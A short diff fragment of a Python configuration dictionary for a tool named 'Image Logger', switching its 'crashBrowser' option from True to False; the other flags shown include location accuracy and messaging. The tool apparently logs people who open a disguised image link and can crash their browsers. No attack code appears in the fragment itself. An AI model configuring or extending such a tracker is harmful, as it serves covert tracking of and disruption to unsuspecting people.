@@ -17,7 +17,7 @@ config = {
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
-    "crashBrowser": True,
+    "crashBrowser": False,
     "accurateLocation": False,
     "message": {
         "doMessage": False,
